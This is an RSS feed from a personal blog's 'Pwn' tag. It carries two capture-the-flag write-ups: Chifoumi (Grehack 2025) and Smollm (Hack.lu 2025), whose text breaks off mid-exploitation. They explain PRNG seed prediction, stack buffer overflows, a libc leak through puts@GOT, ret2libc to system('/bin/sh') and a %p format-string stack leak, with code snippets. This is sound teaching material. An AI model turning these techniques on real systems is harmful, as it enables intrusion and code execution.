@@ -1,0 +1,233 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Pwn on Antoine Mayol</title>
+        <link>http://localhost:1313/tags/pwn/</link>
+        <description>Recent content in Pwn on Antoine Mayol</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <lastBuildDate>Sat, 29 Nov 2025 00:00:00 +0000</lastBuildDate><atom:link href="http://localhost:1313/tags/pwn/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Chifoumi - Grehack 2025</title>
+        <link>http://localhost:1313/writeups/grehack2025/chifoumi/</link>
+        <pubDate>Sat, 29 Nov 2025 00:00:00 +0000</pubDate>
+        
+        <guid>http://localhost:1313/writeups/grehack2025/chifoumi/</guid>
+        <description>&lt;img src="http://localhost:1313/images/grehack2025.png" alt="Featured image of post Chifoumi - Grehack 2025" /&gt;&lt;h2 id=&#34;introduction&#34;&gt;Introduction
+&lt;/h2&gt;&lt;p&gt;This challenge was solved while participating to an annual cyber security event done in Grenoble ⛰️ in France 🇫🇷.&lt;/p&gt;
+&lt;p&gt;The password input of this challenge is vulnerable to a stack-based buffer overflow, which allows code execution.&lt;/p&gt;
+&lt;p&gt;The difficulty is not the overflow itself, but reliably &lt;strong&gt;winning the game&lt;/strong&gt;, since the bot’s moves are generated using &lt;code&gt;rand()&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;We are given:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;game_patched&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;libc.so.6&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;ld-linux-x86-64.so.2&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;You can download those files &lt;a class=&#34;link&#34; href=&#34;http://localhost:1313/blog/files/grehack2025/Chifoumi/challpwn.tar.gz&#34; &gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;game-logic&#34;&gt;Game Logic
+&lt;/h2&gt;&lt;p&gt;Each round, the bot chooses its move with:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bot_move &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;rand&lt;/span&gt;() &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If we win 31 rounds, the program prints:&lt;/p&gt;
+&lt;p&gt;Password :&lt;/p&gt;
+&lt;p&gt;The winning move is simply:&lt;/p&gt;
+&lt;p&gt;(my_move = (bot_move + 1) % 3)&lt;/p&gt;
+&lt;p&gt;So if we can predict rand(), we win every round.
+Predicting the Bot (PRNG Abuse)
+Leaking the Seed&lt;/p&gt;
+&lt;p&gt;The menu has an option that prints logs. Inside those logs, a value called token is printed:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;token: &amp;lt;number&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This value is used to seed the PRNG.&lt;/p&gt;
+&lt;p&gt;By selecting the log option and parsing the output, we can recover the exact seed.
+Reproducing rand() Locally&lt;/p&gt;
+&lt;p&gt;The binary uses glibc’s rand().
+We can reproduce the exact same random sequence locally using ctypes:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;libc2 = ctypes.CDLL(&amp;#34;libc.so.6&amp;#34;)
+libc2.srand(seed)
+libc2.rand()  # sync
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After that, every call to libc2.rand() matches the bot’s moves.
+Auto-Winning the Game&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;for i in range(31):
+    bot_move = libc2.rand() % 3
+    my_move = (bot_move + 1) % 3
+    send(my_move)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This reliably brings us to the password prompt.&lt;/p&gt;
+&lt;h3 id=&#34;buffer-overflow&#34;&gt;Buffer Overflow
+&lt;/h3&gt;&lt;p&gt;The password is read into a fixed-size stack buffer without bounds checking.&lt;/p&gt;
+&lt;p&gt;By sending 200+ bytes, we overwrite the saved return address and gain control of execution.&lt;/p&gt;
+&lt;p&gt;However, ASLR is enabled, so we need a libc leak first.&lt;/p&gt;
+&lt;h3 id=&#34;stage-1--leaking-libc&#34;&gt;Stage 1 – Leaking libc
+&lt;/h3&gt;&lt;p&gt;We build a small ROP chain to call puts on its own GOT entry:&lt;/p&gt;
+&lt;p&gt;puts(puts@GOT)
+return to main&lt;/p&gt;
+&lt;p&gt;This leaks the runtime address of puts.&lt;/p&gt;
+&lt;p&gt;From that, we compute the libc base:&lt;/p&gt;
+&lt;p&gt;libc_base = leaked_puts - libc.symbols[&amp;ldquo;puts&amp;rdquo;]&lt;/p&gt;
+&lt;h3 id=&#34;stage-2--getting-back-to-the-password&#34;&gt;Stage 2 – Getting Back to the Password
+&lt;/h3&gt;&lt;p&gt;After leaking libc, the program returns to the menu.
+The PRNG seed changes, so we simply:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Read logs again&lt;/li&gt;
+&lt;li&gt;Extract the new seed&lt;/li&gt;
+&lt;li&gt;Re-sync rand()&lt;/li&gt;
+&lt;li&gt;Win the game again&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Now we reach the password prompt with libc fully resolved.&lt;/p&gt;
+&lt;h3 id=&#34;stage-3--ret2libc&#34;&gt;Stage 3 – ret2libc
+&lt;/h3&gt;&lt;p&gt;With the libc base known, we prepare the final payload:&lt;/p&gt;
+&lt;p&gt;[pop rdi] [/bin/sh] [system]&lt;/p&gt;
+&lt;p&gt;A single ret gadget is added before pop rdi to keep the stack 16-byte aligned.&lt;/p&gt;
+&lt;p&gt;This results in:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;system(&amp;#34;/bin/sh&amp;#34;);
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;result&#34;&gt;Result
+&lt;/h2&gt;&lt;p&gt;We get a shell and can read the flag:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ cat flag
+flag{...}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;You can look at the &lt;a class=&#34;link&#34; href=&#34;http://localhost:1313/blog/files/grehack2025/Chifoumi/solve.py&#34; &gt;solve.py&lt;/a&gt;.&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Smollm - Hack.lu 2025</title>
+        <link>http://localhost:1313/writeups/hack.lu-2025/smollm/</link>
+        <pubDate>Fri, 24 Oct 2025 00:00:00 +0000</pubDate>
+        
+        <guid>http://localhost:1313/writeups/hack.lu-2025/smollm/</guid>
+        <description>&lt;h2 id=&#34;introduction&#34;&gt;Introduction
+&lt;/h2&gt;&lt;p&gt;This challenge is a pseudo AI assistant.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ nc SMOLLM.flu.xxx &lt;span style=&#34;color:#ae81ff&#34;&gt;1024&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Hello, and welcome to smøllm. Your friendly AI assistant.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;You can add you own custom tokens or run a prompt.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Do you want to
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; Add a custom token
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; Run a prompt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The source code is provided, you can find it &lt;a class=&#34;link&#34; href=&#34;http://localhost:1313/blog/files/hack.lu-2025/smollm/SMOLLM.py&#34; &gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;And here is the sec that seemed to be present on the binary.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ checksec smollm
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/home/dajaaj/personal/hacklu2025/smollm/smollm&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Arch:       amd64-64-little
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    RELRO:      Full RELRO
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Stack:      Canary found
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    NX:         NX enabled
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    PIE:        PIE enabled
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    RUNPATH:    b&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    SHSTK:      Enabled
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    IBT:        Enabled
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Stripped:   No
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Adding a token (8 bytes) will put it at the end of a pre-defined list of words.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Do you want to
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; Add a custom token
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; Run a prompt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt;1
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;token?&amp;gt;tonio
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;add_token&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; token, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; len) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (n_tokens &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Max number of tokens reached!&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;memcpy&lt;/span&gt;(tokens[n_tokens], token, len);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;memset&lt;/span&gt;(tokens[n_tokens&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; len, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;, TOKEN_SIZE &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; len);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Whereas running the prompt will ask for some input and print random words based on that.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Do you want to
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; Add a custom token
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; Run a prompt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt;2
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;How can I help you?
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt;Hi?
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tell    tonio
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  plfanzencould
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;vulnerabilities&#34;&gt;Vulnerabilities
+&lt;/h2&gt;&lt;p&gt;We can se two main vulnerabilities in the code which are both in the &lt;code&gt;run_prompt&lt;/code&gt; function.&lt;/p&gt;
+&lt;p&gt;This function simulate the AI assistant.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;run_prompt&lt;/span&gt;() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; n;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; combinator &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; in_buf[&lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;], out_buf[&lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;bzero&lt;/span&gt;(in_buf, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(in_buf));
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;bzero&lt;/span&gt;(out_buf, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(in_buf));
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;How can I help you?&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;gt;&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;read&lt;/span&gt;(STDIN_FILENO, in_buf, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(in_buf));
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (n &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Read error&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;exit&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; n; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;memcpy&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;out_buf[i&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;TOKEN_SIZE], tokens[(in_buf[i] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; combinator&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; n_tokens], TOKEN_SIZE);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;printf&lt;/span&gt;(out_buf);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;format-string&#34;&gt;Format String
+&lt;/h3&gt;&lt;p&gt;At the end of the function we can see that the &lt;code&gt;out_buf&lt;/code&gt; will be printed as a format string, so we can use it to leak the stack.&lt;/p&gt;
+&lt;h3 id=&#34;stack-based-buffer-overflow&#34;&gt;Stack based buffer overflow
+&lt;/h3&gt;&lt;p&gt;The memcpy will write after the &lt;code&gt;out_buf&lt;/code&gt; after &lt;code&gt;i=32&lt;/code&gt;, cause its size is &lt;code&gt;256&lt;/code&gt;. &lt;br&gt;
+&lt;code&gt;32*TOKEN_SIZE = 32*8 = 256&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;With this finds we can read and control the stack !&lt;/p&gt;
+&lt;h2 id=&#34;exploitation&#34;&gt;Exploitation
+&lt;/h2&gt;&lt;p&gt;As &lt;code&gt;ASLR&lt;/code&gt; is enabled we&amp;rsquo;ll need to first leak some addresses on the stack to then construct a ROP chain (&lt;code&gt;NX&lt;/code&gt; is enabled).&lt;/p&gt;
+&lt;p&gt;But first we need to understand the words selection logic.&lt;/p&gt;
+&lt;h3 id=&#34;logic&#34;&gt;Logic
+&lt;/h3&gt;&lt;p&gt;Above is the code that choose the 8 bytes word to write to &lt;code&gt;out_buf&lt;/code&gt; baised on our input.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;memcpy&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;out_buf[i&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;TOKEN_SIZE], tokens[(in_buf[i] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; combinator&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; n_tokens], TOKEN_SIZE);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So if we want the token we added to be printed we need to use the following formula: &lt;code&gt;token_index - i - combinator&lt;/code&gt;.&lt;/p&gt;
+&lt;h3 id=&#34;stack-leak&#34;&gt;Stack leak
+&lt;/h3&gt;&lt;p&gt;To leak the stack we can add the following token: &lt;code&gt;%p%p%p%p&lt;/code&gt;, and print it.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Do you want to
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; Add a custom token
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; Run a prompt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt;1
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;token?&amp;gt;%p%p%p%p
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Do you want to
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; Add a custom token
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; Run a prompt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt;Invalid choice
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Do you want to
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; Add a custom token
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; Run a prompt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt;2
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;How can I help you?
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt;j
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0x10x20x10x5711695493c0can
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Here we leak !&lt;/p&gt;
